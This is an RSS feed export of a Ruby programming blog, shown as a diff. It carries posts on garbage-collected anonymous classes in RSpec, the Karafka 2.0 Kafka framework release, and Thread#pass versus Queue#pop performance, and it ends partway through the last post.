@@ -1,0 +1,2392 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" xmlns:slash="http://purl.org/rss/1.0/modules/slash/">
+
+<channel>
+	<title>Closer to Code</title>
+	<atom:link href="https://mensfeld.pl/feed/" rel="self" type="application/rss+xml"/>
+	<link>https://mensfeld.pl/</link>
+	<description>Blog about coding in various languages, security, and my other IT adventures.</description>
+	<lastBuildDate>Sun, 13 Nov 2022 14:55:06 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.1.1</generator>
+
+<image>
+	<url>https://mensfeld.pl/wp-content/uploads/2016/10/cropped-icon.ruby_-1-32x32.png</url>
+	<title>Closer to Code</title>
+	<link>https://mensfeld.pl/</link>
+	<width>32</width>
+	<height>32</height>
+</image> 
+	<item>
+		<title>RSpec story about disappearing classes</title>
+		<link>https://mensfeld.pl/2022/11/rspec-story-about-disappearing-classes/</link>
+					<comments>https://mensfeld.pl/2022/11/rspec-story-about-disappearing-classes/#respond</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Sat, 12 Nov 2022 16:30:20 +0000</pubDate>
+				<category><![CDATA[Rails]]></category>
+		<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[Software]]></category>
+		<category><![CDATA[GC]]></category>
+		<category><![CDATA[RSpec]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=5489</guid>
+
+					<description><![CDATA[<p>ActiveSupport#descendants can be slow. In a bigger system with layers of descendants, finding all of them can be time-consuming: puts Benchmark.measure do 100.times { Dispatchers::Base.descendants } end # 5.235370 0.015754 5.251124 ( 5.251069) In the code I've been working on, it meant that a single lookup was taking around 50ms. That is a lot, especially [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2022/11/rspec-story-about-disappearing-classes/">RSpec story about disappearing classes</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p><code>ActiveSupport#descendants</code> can be slow. In a bigger system with layers of descendants, finding all of them can be time-consuming:</p>
+<pre><code class="language-ruby">puts Benchmark.measure do
+  100.times { Dispatchers::Base.descendants }
+end
+
+# 5.235370   0.015754   5.251124 (  5.251069)</code></pre>
+<p>In the code I've been working on, it meant that a single lookup was taking around <strong>50ms</strong>. That is <strong>a lot</strong>, especially if used extensively.</p>
+<p>To mitigate this, I've implemented a simple caching layer on top of the lookup that would make things fast:</p>
+<pre><code class="language-ruby">module Mixins
+  module CachedDescendants
+    extend ActiveSupport::Concern
+
+    cattr_accessor :descendants_map
+
+    self.descendants_map = Concurrent::Hash.new
+
+    class &lt;&lt; self
+      # Clears the descendants map cache - can be hooked to Rails reloader
+      def reload!
+        descendants_map.clear
+      end
+    end
+
+    included do
+      class &lt;&lt; self
+        # @return [Array&lt;Class&gt;] array with descendants classes
+        def cached_descendants
+          ::Mixins::CachedDescendants.descendants_map[self] ||= descendants
+        end
+      end
+    end
+  end
+end</code></pre>
+<p>When included and used, it would give great results:</p>
+<pre><code class="language-ruby">puts Benchmark.measure do
+  100.times { Dispatchers::Base.cached_descendants }
+end
+
+# 0.000023   0.000001   0.000024 (  0.000024)</code></pre>
+<p><strong>99,99956%</strong> faster!</p>
+<p>Such code, like any other, deserves to be tested. I wrote some specs for it, including a relatively simple one:</p>
+<pre><code class="language-ruby">  context &#039;when there are two independent bases&#039; do
+    let(:base1) do
+      Class.new do
+        include ::Mixins::CachedDescendants
+      end
+    end
+
+    let(:base2) do
+      Class.new do
+        include ::Mixins::CachedDescendants
+      end
+    end
+
+    before do
+      Array.new(5) { Class.new(base1) }
+      Array.new(5) { Class.new(base2) }
+    end
+
+    it &#039;expect for them not to interact&#039; do
+      expect(base1.cached_descendants.size).to eq(5)
+      expect(base2.cached_descendants.size).to eq(5)
+      expect(base1.cached_descendants &amp; base2.cached_descendants).to be_empty
+    end
+  end</code></pre>
+<p>It would just ensure that the way we cache does not create collisions for independent descendants trees.</p>
+<p>But once in a while, this code would randomly fail:</p>
+<pre><code class="language-ruby">  1) Mixins::CachedDescendants when there are two independent bases expect for them not to interact
+     Failure/Error: expect(base1.cached_descendants.size).to eq(4)
+       expected: 5
+            got: 4
+       (compared using ==)</code></pre>
+<p>How can I create five classes and suddenly have only 4? I initially thought something was wrong with the descendants lookup for anonymous classes. However, this functionality is heavily used by many, including me, and it never created any problems. On top of that, why would it fail only once in a while?</p>
+<p>When something fails randomly, it usually means that there's an external factor to it. One that operates under the hood. It wasn't different in this case.</p>
+<p>After some investigation, I was able to reproduce it:</p>
+<pre><code class="language-ruby">GC.disable
+
+puts &quot;Total classes before: #{ObjectSpace.count_objects[:T_CLASS]}&quot; 
+puts &quot;String subclasses count before: #{String.subclasses.count}&quot; 
+
+100.times { Class.new(String) }
+
+puts &quot;Total classes after defining: #{ObjectSpace.count_objects[:T_CLASS]}&quot; 
+puts &quot;String subclasses count after defining: #{String.subclasses.count}&quot; 
+
+GC.enable
+GC.start
+
+puts &quot;Total classes after GC: #{ObjectSpace.count_objects[:T_CLASS]}&quot; 
+puts &quot;String subclasses count after GC: #{String.subclasses.count}&quot; 
+
+# Total classes after defining: 1324
+# String subclasses count after defining: 102
+# Running GC...
+# Total classes after GC: 1124
+# String subclasses count after GC: 2</code></pre>
+<p>Boom! Anonymous classes <strong>are</strong> being garbage collected! Classes that are not referenced anywhere are subject to garbage collection like other objects, and this code was not memoizing them:</p>
+<pre><code class="language-ruby">before do
+  Array.new(5) { Class.new(base1) }
+  Array.new(5) { Class.new(base2) }
+end</code></pre>
+<p>Hence, the spec would fail if GC kicked in <strong>exactly</strong> between the classes definitions and the spec execution. This is why it would only fail once in a while.</p>
+<p>Fixing such an issue required only minimal changes to the spec:</p>
+<pre><code class="language-ruby">    let(:descendants) do
+      # This needs to be memorized, otherwise Ruby GC may remove those in between assertions
+      [
+        Array.new(5) { Class.new(base1) },
+        Array.new(5) { Class.new(base2) }
+      ]
+    end
+
+    before { descendants }</code></pre>
+<p>That way, the anonymous classes would be referenced throughout the lifetime of this spec.</p>
+<h3>Summary (TL;DR)</h3>
+<p>Anonymous classes and modules are a subject of garbage collection like any other object. Unless you reference them, they may be gone before wanting to use them via <code>#descendants</code> or similar lookups. Always reference them in some way or face the unexpected.</p>
+<h2>Afterword</h2>
+<p>It was pointed to me by Jean Boussier, that there's an <a href="https://api.rubyonrails.org/classes/ActiveSupport/DescendantsTracker.html"><code>ActiveSupport::DescendantsTracker</code></a> that can also be used to improve the lookup performance and that Ruby <code>3.1</code> has a <code>#subclasses</code> that also is much faster than iterating over <code>ObjectSpace</code>. While their performance is several times faster than the &quot;old&quot; lookup, it is still a magnitude slower than caching the descendants in dev but has similar performance in production.</p>
+<p><code>0.002020</code> vs. <code>0.000023</code> in dev and <code>0.000039</code> vs. <code>0.000042</code> in production.</p>
+<p>The best code is no code, so now I can deprecate my code. The strong class references, however, are still valid and worth keeping in mind.</p>
+<hr/>
+<p>Cover photo by <a href="https://www.flickr.com/photos/eorus/15254853522/">Alper Orus</a> on Attribution-NonCommercial-ShareAlike 2.0 Generic (CC BY-NC-SA 2.0). Image has been cropped.</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2022/11/rspec-story-about-disappearing-classes/">RSpec story about disappearing classes</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2022/11/rspec-story-about-disappearing-classes/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Karafka framework 2.0 announcement</title>
+		<link>https://mensfeld.pl/2022/08/karafka-framework-2-0-announcement/</link>
+					<comments>https://mensfeld.pl/2022/08/karafka-framework-2-0-announcement/#respond</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Tue, 09 Aug 2022 07:40:05 +0000</pubDate>
+				<category><![CDATA[Karafka]]></category>
+		<category><![CDATA[Rails]]></category>
+		<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[apache kafka]]></category>
+		<category><![CDATA[kafka]]></category>
+		<category><![CDATA[karafka]]></category>
+		<category><![CDATA[karafka framework]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=5421</guid>
+
+					<description><![CDATA[<p>I'm thrilled to announce the new and shiny Karafka 2.0. It is an effect of my work of almost four years. For those who wonder what Karafka is, Karafka is a Ruby and Rails multi-threaded efficient Kafka processing framework. Karafka 2.0 is a major rewrite that brings many new things to the table but removes [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2022/08/karafka-framework-2-0-announcement/">Karafka framework 2.0 announcement</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[
+<p>I'm thrilled to announce the new and shiny Karafka 2.0. It is an effect of my work of almost <a href="https://github.com/karafka/karafka/issues/431">four years</a>.</p>
+<p>For those who wonder what <a href="https://github.com/karafka/karafka/">Karafka</a> is, Karafka is a Ruby and Rails multi-threaded efficient Kafka processing framework.</p>
+<p>Karafka 2.0 is a major rewrite that brings many new things to the table but removes specific concepts that were not as good as I initially thought when I created them.</p>
+<p>In this announcement article, I will describe the most noticeable features and improvements that got into this release. If you are interested in a more comprehensive list, you can find it <a href="https://github.com/karafka/karafka/releases/tag/v2.0.0">here</a>.</p>
+<p><strong>Note</strong>: Upgrade notes for migration from Karafka 1.4 to Karafka 2.0 can be found <a href="https://karafka.io/docs/Upgrades-2.0/" title="Karafka 2.0 upgrade notes">here</a>.</p>
+<h3>Getting started</h3>
+<p>If you are new to Karafka and want to play around, follow this demo or visit the <a href="https://karafka.io/docs/Getting-started">Getting Started</a> page:</p>
+<p><script id="asciicast-qXzQmDyH7Rzk5hF8OwXKO92Sh" src="https://asciinema.org/a/qXzQmDyH7Rzk5hF8OwXKO92Sh.js" async></script></p>
+<h3>Noticeable features and improvements</h3>
+<p>This section includes all the noticeable changes you may be interested in if you already work with Karafka or if you want to understand the journey.</p>
+<h4>Multi-threading</h4>
+<p>Most of the engineering work around this release was about performance, scalability, and improvement of the overall engineering experience.</p>
+<p>Multi-threading is probably the most significant change in Karafka since it was created. Up until now, Karafka was single-threaded. That means that any concurrency would have to be implemented by the end user. The reason is dead simple: concurrency is hard. Synchronization is hard. Warranties are hard. I do feel (and can back it up with integration specs) that I tackled it pretty well.</p>
+<p>Karafka 2.0 uses native Ruby threads to achieve concurrent processing in three scenarios:</p>
+<ul>
+<li>for concurrent processing of messages from different topics partitions.</li>
+<li>for concurrent processing of messages from a single partition when using the <a href="https://karafka.io/docs/Pro-Virtual-Partitions">Virtual Partitions</a> feature.</li>
+<li>to handle consumer groups management (each consumer group defined will be managed by a separate thread)</li>
+</ul>
+<p>This can bring big advantages when any IO is involved.</p>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/08/workers-performance.png" alt="" width="671" height="363" class="aligncenter size-full wp-image-5427" srcset="https://mensfeld.pl/wp-content/uploads/2022/08/workers-performance.png 671w, https://mensfeld.pl/wp-content/uploads/2022/08/workers-performance-300x162.png 300w" sizes="(max-width: 671px) 100vw, 671px" /></p>
+<p>When you start consuming messages, Karafka will fetch and distribute data to utilize multiple threads while preserving all the Kafka ordering warranties.</p>
+<p>Years ago, I developed a lot of in-app async code to bypass Karafka limitations, and it makes me extremely happy to be able to retire all of it.</p>
+<p>But wait, there's more...</p>
+<h4>Virtual Partitions</h4>
+<p><a href="https://karafka.io/docs/Pro-Virtual-Partitions">Virtual Partitions</a> allow you to parallelize the processing of data from a single partition. This can drastically increase throughput when IO operations are involved.</p>
+<p>While the default scaling strategy for Kafka consumers is to increase partitions count and number of consumers, in many cases, this will not provide you with desired effects. In the end, you cannot go with this strategy beyond assigning one process per single topic partition. That means that without a way to parallelize the work further, IO may become your biggest bottleneck.</p>
+<p>Virtual Partitions solve this problem by providing you with the means to further parallelize work by creating &quot;virtual&quot; partitions that will operate independently but will obey all the Kafka warranties as a collective processing unit.</p>
+<pre><code class="language-ruby">topic :orders_states do
+  consumer OrdersStatesConsumer
+  # Distribute work to virtual partitions based on the user id
+  virtual_partitions(
+    partitioner: -&gt;(message) { message.payload[:user_id] }
+  )
+end</code></pre>
+<p>With Virtual Partitions, you benefit from both worlds: scaling with Kafka partitions and scaling with Ruby threads.</p>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/08/virtual_partitions_performance.png" alt="" width="589" height="361" class="aligncenter size-full wp-image-5433" srcset="https://mensfeld.pl/wp-content/uploads/2022/08/virtual_partitions_performance.png 589w, https://mensfeld.pl/wp-content/uploads/2022/08/virtual_partitions_performance-300x184.png 300w" sizes="(max-width: 589px) 100vw, 589px" /></p>
+<p>*This example illustrates the throughput difference for IO intense work, where the IO cost of processing a single message is 1ms. </p>
+<h4>Active Job support</h4>
+<p>Active Job is a standard interface for interacting with job runners in Ruby on Rails. Active Job can be configured to work with Karafka.</p>
+<p>While Kafka is not a message queue, I still decided to create an Active Job adapter for it. Why? Because <a href="https://karafka.io/docs/Pro-Enhanced-Active-Job/#ordered-jobs">ordered jobs</a> are something, I always wished for Ruby on Rails to have. On top of that, you may already have Kafka and only a few jobs to run. If so, why not use it and save yourself a hustle of yet another tool to maintain?</p>
+<pre><code class="language-ruby">class Application &lt; Rails::Application
+  # ...
+  config.active_job.queue_adapter = :karafka
+end</code></pre>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/08/enhanced_aj_ordering.png" alt="" width="601" height="311" class="aligncenter size-full wp-image-5440" srcset="https://mensfeld.pl/wp-content/uploads/2022/08/enhanced_aj_ordering.png 601w, https://mensfeld.pl/wp-content/uploads/2022/08/enhanced_aj_ordering-300x155.png 300w" sizes="(max-width: 601px) 100vw, 601px" /></p>
+<h4>End-to-end integration test suite</h4>
+<p>Karafka comes with a home-brew framework for running end-to-end <a href="https://github.com/karafka/karafka/tree/2.0/spec/integrations">integration specs</a> against Kafka. I did my best to describe every possible case I could have imagined to ensure that the framework behaves as expected under any circumstances.</p>
+<p>It is also a great place to learn about how Karafka behaves in particular scenarios.</p>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/08/Zrzut-ekranu-z-2022-08-08-17-27-58.png" alt="" width="764" height="162" class="aligncenter size-full wp-image-5446" srcset="https://mensfeld.pl/wp-content/uploads/2022/08/Zrzut-ekranu-z-2022-08-08-17-27-58.png 764w, https://mensfeld.pl/wp-content/uploads/2022/08/Zrzut-ekranu-z-2022-08-08-17-27-58-300x64.png 300w" sizes="(max-width: 764px) 100vw, 764px" /></p>
+<h4>Lower supply chain fingerprint</h4>
+<p>The number of external dependencies Karafka relies on has been reduced significantly. It was done to ensure that Karafka can be integrated into and upgraded in applications without causing dependency conflicts.</p>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/08/chain-1024x643.png" alt="" width="766" height="481" class="aligncenter size-large wp-image-5448" srcset="https://mensfeld.pl/wp-content/uploads/2022/08/chain-1024x643.png 1024w, https://mensfeld.pl/wp-content/uploads/2022/08/chain-300x188.png 300w, https://mensfeld.pl/wp-content/uploads/2022/08/chain-768x482.png 768w, https://mensfeld.pl/wp-content/uploads/2022/08/chain-766x481.png 766w, https://mensfeld.pl/wp-content/uploads/2022/08/chain.png 1301w" sizes="(max-width: 766px) 100vw, 766px" /></p>
+<h4>Upgraded documentation</h4>
+<p><a href="https://github.com/karafka/karafka/wiki">Karafka</a> and <a href="https://github.com/karafka/waterdrop">WaterDrop</a> have been fully updated with several new sections describing use-cases, edge-cases and providing help and suggestions for both simple and advanced usage.</p>
+<h4>Out-of-the-box DataDog and StatsD instrumentation</h4>
+<p>Using DataDog or StatsD? In just a few lines you can enable full instrumentation of both <a href="https://karafka.io/docs/Monitoring-and-logging/#datadog-and-statsd-integration">consumption</a> and <a href="https://github.com/karafka/waterdrop#datadog-and-statsd-integration">production</a> of messages:</p>
+<pre><code class="language-ruby"># initialize the listener with statsd client
+dd_listener = ::Karafka::Instrumentation::Vendors::Datadog::Listener.new do |config|
+  config.client = Datadog::Statsd.new(&#039;localhost&#039;, 8125)
+  # Publish host as a tag alongside the rest of tags
+  config.default_tags = [&quot;host:#{Socket.gethostname}&quot;]
+end
+
+# Subscribe with your listener to Karafka and you should be ready to go!
+Karafka.monitor.subscribe(dd_listener)</code></pre>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/08/karafka_dd_dashboard_example-1024x346.png" alt="" width="766" height="259" class="aligncenter size-large wp-image-5456" srcset="https://mensfeld.pl/wp-content/uploads/2022/08/karafka_dd_dashboard_example-1024x346.png 1024w, https://mensfeld.pl/wp-content/uploads/2022/08/karafka_dd_dashboard_example-300x101.png 300w, https://mensfeld.pl/wp-content/uploads/2022/08/karafka_dd_dashboard_example-768x260.png 768w, https://mensfeld.pl/wp-content/uploads/2022/08/karafka_dd_dashboard_example-1536x519.png 1536w, https://mensfeld.pl/wp-content/uploads/2022/08/karafka_dd_dashboard_example-766x259.png 766w, https://mensfeld.pl/wp-content/uploads/2022/08/karafka_dd_dashboard_example.png 1745w" sizes="(max-width: 766px) 100vw, 766px" /></p>
+<h4>License change</h4>
+<p>Karafka 2.0 is dual licensed under LGPL and a <a href="https://github.com/karafka/karafka/blob/master/LICENSE-COMM">Commercial License</a>. Depending on your use-case, you should be good with one or the other.</p>
+<p><strong>Note</strong>: Before the license change, I <strong>did</strong> obtain the consent of all the contributors for a re-license. I want to say thank you to each of you for allowing me to do so.</p>
+<h4>Seamless Ruby on Rails integration</h4>
+<p>Karafka always had good integration with Ruby on Rails. With the 2.0 release, however, this integration is elevated to another level: no more files editing, no more configuration copying. Everything works out of the box.</p>
+<h3>Karafka Pro</h3>
+<p>This release is the first release that includes a <a href="https://karafka.io/#become-pro">Pro subscription</a>.</p>
+<p>Building a complex and reliable open-source is neither easy nor fast. Many companies rely on Karafka, and following <a href="https://www.mikeperham.com/2015/11/23/how-to-charge-for-your-open-source/">Mikes Perham advice</a> I have decided to introduce the Pro subscription to be able to support the further development of the ecosystem.</p>
+<p>Karafka Pro has many valuable, well-documented, well-tested functionalities that can significantly improve your day-to-day operations with Kafka in Ruby. It also introduces commercial support, as due to a sheer number of questions and requests, I do need to have a way to prioritize those.</p>
+<p>SInce it's not only me, <strong>20%</strong> of the income will be further distributed down the supply chain pipeline to support the work of people I rely on.</p>
+<p>Help me build and maintain a high-quality Kafka ecosystem for Ruby and Ruby on Rails.</p>
+<p>Buy <a href="https://karafka.io/#become-pro">Karafka Pro</a>.</p>
+<h3>Karafka 1.4 maintenance</h3>
+<p>With this release an <a href="https://karafka.io/docs/Versions-Lifecycle-and-EOL/">official EOL policies</a> have been introduced. Karafka 1.4 will be supported until the end of February 2023.</p>
+<p>Karafka 2.0 has a lower dependency fingerprint and is in everything 1.4 was not. I strongly encourage you to upgrade.</p>
+<h3>What's ahead</h3>
+<p>Many things. This release is just the beginning. I am already working on a 2.1 release that will include several great additions, including:</p>
+<ul>
+<li>Management Web-UI similar to the one Resque and Sidekiq have</li>
+<li>Producer transactions</li>
+<li>At Rest encryption</li>
+<li>CurrentAttributes support for ActiveJob</li>
+<li>Seamless Dead-Letter Queue integration</li>
+</ul>
+<h3>Upgrade notes</h3>
+<p>Upgrade notes for migration from Karafka 1.4 to Karafka 2.0 can be found <a href="https://karafka.io/docs/Upgrades-2.0/" title="Karafka 2.0 upgrade notes">here</a>.</p>
+<h3>References</h3>
+<ul>
+<li><a href="https://github.com/karafka/karafka/">Karafka Github</a></li>
+<li><a href="https://karafka.io/docs/Getting-started">Getting started with Karafka</a></li>
+<li><a href="https://github.com/karafka/karafka/releases/tag/v2.0.0">Github Karafka 2.0 release notes</a></li>
+<li><a href="https://karafka.io/docs">Karafka 2.0 docs</a></li>
+<li><a href="https://github.com/karafka/waterdrop">WaterDrop (producer) wiki</a></li>
+<li><a href="https://github.com/karafka/example-apps">Example applications</a></li>
+<li><a href="https://karafka.io/docs/Upgrades-2.0/">Karafka 2.0 upgrade notes</a></li>
+</ul>
+<hr/>
+<p>Stay tuned and don't forget to join our <a href="https://slack.karafka.io">Slack channel</a>.</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2022/08/karafka-framework-2-0-announcement/">Karafka framework 2.0 announcement</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2022/08/karafka-framework-2-0-announcement/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Reduce your method calls by 99.9% by replacing Thread#pass with Queue#pop</title>
+		<link>https://mensfeld.pl/2022/01/reduce-your-method-calls-by-99-9-by-replacing-threadpass-with-queuepop/</link>
+					<comments>https://mensfeld.pl/2022/01/reduce-your-method-calls-by-99-9-by-replacing-threadpass-with-queuepop/#comments</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Wed, 19 Jan 2022 15:46:20 +0000</pubDate>
+				<category><![CDATA[Karafka]]></category>
+		<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[Software]]></category>
+		<category><![CDATA[benchmark]]></category>
+		<category><![CDATA[karafka]]></category>
+		<category><![CDATA[karafka framework]]></category>
+		<category><![CDATA[Performance]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=5324</guid>
+
+					<description><![CDATA[<p>When doing multi-threaded work in Ruby, there are a couple of ways to control the execution flow within a given thread. In this article, I will be looking at Thread#pass and Queue#pop and how understanding each of them can help you drastically optimize your applications. Thread#pass - what it is and how does it work [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2022/01/reduce-your-method-calls-by-99-9-by-replacing-threadpass-with-queuepop/">Reduce your method calls by 99.9% by replacing Thread#pass with Queue#pop</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>When doing multi-threaded work in Ruby, there are a couple of ways to control the execution flow within a given thread. In this article, I will be looking at <code>Thread#pass</code> and <code>Queue#pop</code> and how understanding each of them can help you drastically optimize your applications.</p>
+<h2>Thread#pass - what it is and how does it work</h2>
+<p>One of the ways you can ask the scheduler to &quot;do something else&quot; is by using the <code>Thread#pass</code> method.</p>
+<p>Where can you find it? Well, aside from Karafka, for example in one of the most recent additions to ActiveRecord called <code>#load_async</code> (<a href="https://github.com/rails/rails/pull/41372/files#diff-642b90553b888bd2c724c093a1a685a5408a7d8293f3751366c25dc548936eb7R462">pull request</a>).</p>
+<p>Let's see how it works and why it may or may not be what you are looking for when building multi-threaded applications.</p>
+<p>Ruby <a href="https://ruby-doc.org/core-3.1.0/Thread.html#method-c-pass">docs</a> are rather minimalistic with its description:</p>
+<blockquote>
+<p>Give the thread scheduler a hint to pass execution to another thread. A running thread may or may not switch, it depends on OS and processor.</p>
+</blockquote>
+<p>That means that when dealing with threads, you can tell Ruby that it would not be a bad idea to switch from executing the current one and focusing on others.</p>
+<p>By default, all the threads you create have the same priority and are treated the same way. An excellent illustration of this is the code below:</p>
+<pre><code class="language-ruby">threads = []
+
+threads = 10.times.map do |i|
+  Thread.new do
+    # Make threads wait for a bit so all threads are created
+    sleep(0.001) until threads.size == 10
+
+    start = Time.now.to_f
+
+    10_000_000.times do
+      start / rand
+    end
+
+    puts &quot;Thread #{i},#{Time.now.to_f - start}&quot;
+  end
+end
+
+threads.each(&amp;:join)
+
+# for i in {1..1000}; do ruby threads.rb; done &gt; results.txt</code></pre>
+<p>on average, the computation in each of them took a similar amount of time:</p>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-18-19-00-09.png" alt="" width="579" height="377" class="aligncenter size-full wp-image-5337" srcset="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-18-19-00-09.png 579w, https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-18-19-00-09-300x195.png 300w" sizes="(max-width: 579px) 100vw, 579px" /></p>
+<p>The difference in between the fastest and the slowest thread was less than 8%.</p>
+<p>However, when one of the threads &quot;passes,&quot; things change drastically:</p>
+<pre><code class="language-ruby">threads = []
+
+threads = 10.times.map do |i|
+  Thread.new do
+    sleep(0.001) until threads.size == 10
+
+    start = Time.now.to_f
+
+    10_000_000.times do
+      Thread.pass if i.zero?
+
+      start / rand
+    end
+
+    puts &quot;Thread #{i},#{Time.now.to_f - start}&quot;
+  end
+end
+
+threads.each(&amp;:join)</code></pre>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-18-19-41-44.png" alt="" width="590" height="383" class="aligncenter size-full wp-image-5345" srcset="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-18-19-41-44.png 590w, https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-18-19-41-44-300x195.png 300w" sizes="(max-width: 590px) 100vw, 590px" /></p>
+<p>Now, thread zero takes twice as much time as other threads doing the same job.</p>
+<p>What is worth pointing out is that this method does <strong>not</strong> stop the execution flow by itself, and it just suggests to Ruby that there may be other more important things to do.</p>
+<p>Exactly this behaviour was used by Jean Boussier in ActiveRecord:</p>
+<pre><code class="language-ruby">def schedule_query(future_result) # :nodoc:
+  @async_executor.post { future_result.execute_or_skip }
+  Thread.pass
+end</code></pre>
+<p>This code schedules a background job and suggests to the scheduler that it may be worth doing that or other things somewhere else.</p>
+<p>It is worth mentioning, that when all the threads use the <code>Thread#pass</code>, it becomes a <strong>colossal</strong> burden to the Ruby VM. Ruby goes crazy since none of the threads wants to do any work and the execution time increases  over 100 times.</p>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-18-20-45-08.png" alt="" width="586" height="378" class="aligncenter size-full wp-image-5347" srcset="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-18-20-45-08.png 586w, https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-18-20-45-08-300x194.png 300w" sizes="(max-width: 586px) 100vw, 586px" /></p>
+<h2>Queue#pop - What it is and how does it work</h2>
+<p><code>Queue</code> is a well known class and <code>#pop</code>is one of the most important methods it contains.</p>
+<p>Here is what Ruby docs say about the <code>Queue</code> class and the <code>#pop method</code>:</p>
+<blockquote>
+<p>The Queue class implements multi-producer, multi-consumer queues. It is especially useful in threaded programming when information must be exchanged safely between multiple threads. The Queue class implements all the required locking semantics.</p>
+<p>#pop: If the queue is empty, the calling thread is suspended until data is pushed onto the queue. If non_block is true, the thread isn't suspended, and ThreadError is raised.</p>
+</blockquote>
+<p>When asked about queues, most programmers think about workers consuming jobs from a queue:</p>
+<pre><code class="language-ruby">numbers = Queue.new
+
+threads = 10.times.map do |i|
+  Thread.new do
+    while number = numbers.pop
+      result = Time.now.to_f / number
+
+      # a bit of randomness
+      sleep(rand / 1_000)
+
+      puts &quot;Thread #{i},#{result}&quot;
+    end
+  end
+end
+
+10_000.times { numbers &lt;&lt; rand }
+
+# see what I did here? ;)
+Thread.pass until numbers.empty?
+
+numbers.close
+
+threads.each(&amp;:join)</code></pre>
+<p>What is worth keeping in mind about <code>Queue#pop</code> is that it will block the execution in a given thread until there is something to do. This means, that a blocked thread becomes almost &quot;invisible&quot; from the performance perspective. Here's an example of running computations with 0 , 4, 9 and 99 blocked threads:</p>
+<pre><code class="language-ruby">queue = Queue.new
+
+THREADS = 4
+
+THREADS.times do
+  Thread.new { queue.pop }
+end
+
+# Wait until all the threads are initialized
+Thread.pass until queue.num_waiting == THREADS
+
+start = Time.now.to_f
+
+10_000_000.times do
+  start / rand
+end
+
+puts Time.now.to_f - start</code></pre>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-18-21-18-55.png" alt="" width="590" height="360" class="aligncenter size-full wp-image-5352" srcset="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-18-21-18-55.png 590w, https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-18-21-18-55-300x183.png 300w" sizes="(max-width: 590px) 100vw, 590px" /></p>
+<p>As you can see, inactive threads do not have a big impact on the overall performance of this code. Even with <strong>99</strong> extra threads, the end result is not far away from the baseline.</p>
+<h2>Reducing method calls in a multi-threaded environment</h2>
+<p>Now that you know what <code>Thread#pass</code> and <code>Queue#pop</code> do, lets put them to work in a real use case. For that to happen we will be looking into the <a href="https://github.com/karafka/karafka" title="Karafka">Karafka</a> framework.</p>
+<p>Karafka is a framework used to simplify Apache Kafka-based Ruby applications development that I built. The version <code>2.0</code> supports work distribution across multiple threads. The way it works from a data processing perspective is quite simple:</p>
+<p>
+1. Take some data from Kafka<br />
+2. Divide it into processing units (jobs)<br />
+3. Put all the jobs into a queue<br />
+4. Wait for all the workers to pick the jobs and finish all the work<br />
+5. Repeat endlessly
